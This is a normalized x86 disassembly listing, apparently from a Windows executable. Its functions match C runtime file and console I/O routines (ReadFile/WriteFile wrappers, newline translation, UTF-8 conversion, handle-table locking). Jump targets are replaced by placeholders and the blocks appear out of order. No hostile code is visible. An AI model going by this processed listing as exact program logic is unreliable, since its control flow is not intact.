jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_40ebab
cmp eax 0xfffffffe
pop ecx
je r-xdata
pop edi
pop esi
retn
test ax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_40ebab
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_40ebab
and eax 0x1f
imul eax eax 0x28
add eax [ edi ]
pop ecx
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_413c2c
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
cmp esi eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
jne r-xdata
push edi
xor edi edi
cmp esi edi
jl r-xdata
call sub_41209c
and [ eax ] 0x0
call sub_412089
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_41209c
mov [ eax ] edi
call sub_412089
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x9
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop edi
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx edi
mov [ ebp - 0x10 ] edi
je r-xdata
call sub_41209c
mov [ eax ] edi
call sub_412089
mov [ eax ] 0x9
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_41202a
add esp 0x14
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
call sub_41209c
mov [ eax ] edi
call sub_412089
mov [ eax ] 0x16
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
je r-xdata
pop ebx
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
push 0x4
pop ecx
shr eax 0x1
cmp eax ecx
mov [ ebp + 0x10 ] ecx
jb r-xdata
mov [ ebp - 0xc ] ecx
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_413757
cmp eax edi
pop ecx
mov [ ebp - 0xc ] eax
jne r-xdata
mov [ ebp + 0x10 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ ebx ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ edi + 0x5 ]
cmp cl 0xa
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
mov ecx [ ebx ]
mov eax [ ebp - 0xc ]
lea edi [ esi + ecx ]
test [ edi + 0x4 ] 0x48
je r-xdata
call sub_412089
mov [ eax ] 0xc
call sub_41209c
mov [ eax ] 0x8
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov edi [ ebp - 0x18 ]
test edi edi
jl r-xdata
xor edx edx
cmp [ ebp + 0x10 ] edx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_412089
mov [ eax ] 0x9
call sub_41209c
mov [ eax ] esi
jmp r-xdata
cmp edi [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ ebx ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] dl
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_4120af
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx ]
add [ ebp - 0x10 ] edi
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ ebx ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_40fdab
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] edx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov [ eax ] cl
mov ecx [ ebx ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ ebx ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub edi [ ebp - 0xc ]
mov [ ebp - 0x10 ] edi
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax edi
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] edx
je r-xdata
mov ecx [ ebx ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax edi
cmp edi eax
mov [ ebp + 0x10 ] edi
mov [ ebp - 0x10 ] eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ ebx ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax edi
cmp edi eax
mov [ ebp + 0x10 ] edi
mov [ ebp - 0x10 ] eax
jae r-xdata
mov [ eax ] cl
mov ecx [ ebx ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ edi ] ax
inc edi
inc edi
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ edi ] cx
inc edi
inc edi
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec edi
mov cl [ edi ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ edi ] al
inc edi
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ edi ] al
inc edi
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebx ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc edi
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ ebx ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub edi [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push edi
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
test eax eax
mov [ ebp - 0x10 ] eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
mov [ edi ] 0xd
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc edi
inc edi
cmp eax 0x4
jg r-xdata
mov dl [ edi ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
add eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ edi ] 0xd
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc edi
cmp edi [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp edi [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_412089
mov [ eax ] 0x2a
jmp r-xdata
cmp edi [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_415383
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
mov [ edi ] 0xa
jmp r-xdata
mov [ edi ] 0xd
mov eax [ ebx ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ ebx ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ ebx ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec edi
movzx ecx [ edi ]
inc eax
mov ecx [ ebx ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add edi eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_415383
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ edi ] 0xa
jmp r-xdata
mov [ edi ] 0xd
mov eax [ ebx ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_415383
add esp 0x10
inc edi
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ edi ]
mov ecx [ ebx ]
mov [ esi + ecx + 0x25 ] dl
inc edi
sub edi eax
jmp r-xdata
mov dl [ edi ]
mov ecx [ ebx ]
mov [ esi + ecx + 0x26 ] dl
inc edi
sub_4141ce
push 0x10
push r--data
call sub_412340
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_41209c
and [ eax ] 0x0
call sub_412089
mov [ eax ] 0x9
call sub_41209c
mov [ eax ] edi
call sub_412089
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_41202a
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_412385
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ ebx ]
movzx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_414b36
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_412089
mov [ eax ] 0x9
call sub_41209c
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413c2c
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4142a0
mov eax [ ebp - 0x1c ]
sub_4142aa
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_412089
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_40fb30
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_410ec0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_412089
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_41202a
add esp 0x14
mov eax esi
jmp r-xdata
sub_414325
push ebp
lea ebp [ esp - 0x518 ]
sub esp 0x594
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x514 ] eax
mov eax [ ebp + 0x524 ]
push esi
xor esi esi
cmp [ ebp + 0x528 ] esi
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x68 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x520 ]
push ebx
mov ebx esi
and ebx 0x1f
imul ebx ebx 0x28
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
add eax ebx
mov cl [ eax + 0x24 ]
add cl cl
sar cl 0x1
cmp cl 0x2
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x55 ] cl
je r-xdata
call sub_41209c
mov [ eax ] esi
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x514 ]
xor ecx ebp
pop esi
call sub_413965
add ebp 0x518
leave
retn
mov ecx [ ebp + 0x528 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_41209c
xor esi esi
mov [ eax ] esi
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
jmp r-xdata
push esi
call sub_419b54
test eax eax
pop ecx
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_415383
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ edi ]
add eax ebx
test [ eax + 0x4 ] 0x80
je r-xdata
mov eax [ edi ]
test [ ebx + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x6c ]
push ecx
push [ ebp + 0x528 ]
push [ ebp - 0x64 ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x64 ]
xor esi esi
cmp [ ebp - 0x55 ] 0x0
mov [ ebp - 0x54 ] esi
jne r-xdata
call sub_4118e7
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x7c ]
sete cl
push eax
mov eax [ edi ]
push [ ebx + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x6c ]
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x60 ] eax
jmp r-xdata
cmp [ ebp - 0x55 ] 0x2
jne r-xdata
cmp [ ebp + 0x528 ] esi
mov [ ebp - 0x50 ] eax
jbe r-xdata
test esi esi
je r-xdata
sub eax [ ebp - 0x68 ]
mov edi [ ebp - 0x70 ]
mov eax [ ebp - 0x60 ]
test eax eax
jne r-xdata
cmp [ ebp + 0x528 ] esi
mov [ ebp - 0x5c ] eax
jbe r-xdata
cmp [ ebp + 0x528 ] esi
mov [ ebp - 0x50 ] eax
jbe r-xdata
mov eax [ edi ]
test [ ebx + eax + 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x50 ]
and [ ebp - 0x5c ] 0x0
sub ecx [ ebp - 0x64 ]
lea eax [ ebp - 0x4c ]
call [ GetConsoleCP@IAT ]
and [ ebp - 0x50 ] 0x0
cmp [ ebp + 0x528 ] 0x0
mov esi [ ebp - 0x64 ]
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x74 ] esi
jbe r-xdata
cmp [ ebp - 0x55 ] 0x0
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x54 ] esi
jne r-xdata
mov ecx [ ebp - 0x5c ]
and [ ebp - 0x50 ] 0x0
sub ecx [ ebp - 0x64 ]
push 0x2
lea eax [ ebp + 0x3b8 ]
pop esi
mov ecx [ ebp - 0x50 ]
xor esi esi
sub ecx [ ebp - 0x64 ]
lea eax [ ebp - 0x4c ]
call sub_412089
mov [ eax ] 0x1c
mov eax [ ebp - 0x64 ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x4c ]
sub esi eax
push 0x0
lea eax [ ebp - 0x6c ]
push eax
push esi
lea eax [ ebp - 0x4c ]
push eax
mov eax [ edi ]
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
xor esi esi
cmp [ ebp - 0x54 ] esi
je r-xdata
and [ ebp - 0x5c ] 0x0
jmp r-xdata
push [ ebp - 0x54 ]
call sub_4120af
pop ecx
jmp r-xdata
call sub_412089
mov [ eax ] 0x9
jmp r-xdata
xor esi esi
push esi
push esi
push 0x2ab
lea ecx [ ebp + 0x108 ]
push ecx
lea ecx [ ebp + 0x3b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edi eax
cmp edi esi
je r-xdata
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
add [ ebp - 0x5c ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x4c ]
sub esi eax
push 0x0
lea eax [ ebp - 0x6c ]
push eax
push esi
lea eax [ ebp - 0x4c ]
push eax
mov eax [ edi ]
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x50 ]
add [ ebp - 0x50 ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x6c ]
add [ ebp - 0x60 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x5c ]
cmp [ ebp - 0x5c ] 0x400
jb r-xdata
inc [ ebp - 0x68 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x5c ]
mov al [ ebp - 0x55 ]
test al al
jne r-xdata
call sub_41209c
mov [ eax ] esi
push 0x0
lea eax [ ebp - 0x6c ]
push eax
mov eax edi
sub eax esi
push eax
lea eax [ ebp + esi + 0x108 ]
push eax
mov eax [ ebp - 0x70 ]
mov eax [ eax ]
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x50 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x50 ] 0x152
jb r-xdata
mov [ eax ] 0xd
add eax esi
add [ ebp - 0x50 ] esi
mov eax [ ebp - 0x6c ]
add [ ebp - 0x60 ] eax
cmp eax esi
jl r-xdata
mov edi [ ebp - 0x70 ]
mov [ eax ] dx
inc eax
inc eax
inc esi
inc esi
cmp esi 0x3ff
jb r-xdata
add [ ebp - 0x68 ] 0x2
mov [ eax ] 0xd
inc eax
inc eax
inc esi
inc esi
mov eax [ ebp - 0x50 ]
sub eax [ ebp - 0x64 ]
cmp eax [ ebp + 0x528 ]
jb r-xdata
cmp ecx [ ebp + 0x528 ]
jae r-xdata
cmp al 0x1
je r-xdata
mov al [ esi ]
xor ecx ecx
cmp al 0xa
sete cl
movsx eax al
push eax
mov [ ebp - 0x78 ] ecx
call sub_419d62
test eax eax
pop ecx
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x54 ] eax
add esi [ ebp - 0x6c ]
cmp edi esi
jg r-xdata
cmp ecx [ ebp + 0x528 ]
jae r-xdata
mov eax [ ebp - 0x50 ]
sub eax [ ebp - 0x64 ]
cmp eax [ ebp + 0x528 ]
jb r-xdata
cmp ecx [ ebp + 0x528 ]
jae r-xdata
jmp r-xdata
movzx ecx [ esi ]
xor edx edx
cmp cx 0xa
sete dl
inc esi
inc esi
add [ ebp - 0x5c ] 0x2
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x78 ] edx
cmp al 0x2
jne r-xdata
mov eax [ ebp - 0x64 ]
sub eax esi
add eax [ ebp + 0x528 ]
cmp eax 0x1
jbe r-xdata
push 0x1
lea eax [ ebp - 0x54 ]
push esi
push eax
call sub_41a0f8
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x5c ]
sub eax [ ebp - 0x64 ]
cmp eax [ ebp + 0x528 ]
mov [ ebp - 0x60 ] eax
jb r-xdata
jmp r-xdata
jmp r-xdata
push [ ebp - 0x54 ]
call sub_419f23
cmp ax [ ebp - 0x54 ]
pop ecx
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x2
lea eax [ ebp - 0x54 ]
push esi
push eax
call sub_41a0f8
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
jmp r-xdata
cmp edi esi
jg r-xdata
inc [ ebp - 0x60 ]
cmp [ ebp - 0x78 ] 0x0
je r-xdata
mov eax [ ebp + 0x528 ]
cmp [ ebp - 0x5c ] eax
jb r-xdata
inc esi
inc [ ebp - 0x5c ]
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp + 0x50c ]
push ecx
push 0x1
lea ecx [ ebp - 0x54 ]
push ecx
push eax
push [ ebp - 0x7c ]
inc esi
inc [ ebp - 0x5c ]
mov [ ebp - 0x74 ] esi
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x54 ] eax
call sub_419f23
cmp ax [ ebp - 0x54 ]
pop ecx
jne r-xdata
mov esi [ ebp - 0x74 ]
jmp r-xdata
push 0x0
lea eax [ ebp - 0x50 ]
push eax
push esi
lea eax [ ebp + 0x50c ]
push eax
mov eax [ edi ]
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc [ ebp - 0x60 ]
inc [ ebp - 0x68 ]
mov eax [ ebp - 0x50 ]
add [ ebp - 0x60 ] eax
cmp eax esi
jl r-xdata
cmp [ ebp - 0x78 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x50 ]
push eax
push 0x1
lea eax [ ebp + 0x50c ]
push eax
mov eax [ edi ]
mov [ ebp + 0x50c ] 0xd
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x50 ] 0x1
jl r-xdata
inc [ ebp - 0x68 ]
inc [ ebp - 0x60 ]
jmp r-xdata
sub_4148eb
push 0x10
push r--data
call sub_412340
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_41209c
and [ eax ] 0x0
call sub_412089
mov [ eax ] 0x9
call sub_41209c
mov [ eax ] edi
call sub_412089
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_41202a
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_412385
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ ebx ]
movzx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_414b36
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_412089
mov [ eax ] 0x9
call sub_41209c
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_414325
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4149bd
mov eax [ ebp - 0x1c ]
sub_4149c7
mov eax [ esp + 0x4 ]
test eax eax
push esi
push edi
jl r-xdata
call sub_412089
mov [ eax ] 0x9
call sub_41209c
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_414a44
mov ecx [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_412089
mov [ eax ] 0x9
call sub_41209c
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov esi ecx
and esi 0x1f
imul esi esi 0x28
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_414ac5
mov eax [ esp + 0x4 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_41209c
and [ eax ] 0x0
call sub_412089
mov [ eax ] 0x9
or eax 0xffffffff
retn
call sub_41209c
mov [ eax ] esi
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_41202a
add esp 0x14
or eax 0xffffffff
pop esi
retn
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
and eax 0x1f
imul eax eax 0x28
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
pop esi
retn
sub_414b36
push 0xc
push r--data
call sub_412340
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
imul esi esi 0x28
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_411ef3
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_412385
retn
mov eax edi
sar eax 0x5
and edi 0x1f
imul edi edi 0x28
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_414bcd
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_412928
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_414bf8
push 0x18
push r--data
call sub_412340
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_411e30
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_411ef3
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_414d8e
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_412385
retn
push 0x28
push 0x20
call sub_413797
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x500
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
